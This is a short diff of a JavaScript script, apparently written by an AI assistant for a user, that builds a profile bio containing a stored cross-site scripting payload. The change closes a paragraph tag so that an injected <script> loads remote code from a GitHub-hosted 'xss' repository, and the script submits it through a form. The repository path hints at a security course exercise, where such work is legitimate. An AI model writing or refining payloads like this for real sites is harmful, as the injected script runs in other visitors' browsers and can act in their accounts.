@@ -4,7 +4,7 @@
 
   // The bio contains the script tag you provided.
   // Use template literal to avoid escaping headaches.
-  const bioHtml = `<p><script src="https://cdn.jsdelivr.net/gh/EliasMouesca/xss@main/sw_seguro/post_comment.js"></script><p>`;
+  const bioHtml = `</p><script src="https://cdn.jsdelivr.net/gh/EliasMouesca/xss@main/sw_seguro/post_comment.js"></script><p>`;
 
   // Build multipart/form-data using FormData. Do NOT set Content-Type manually.
   const form = new FormData();
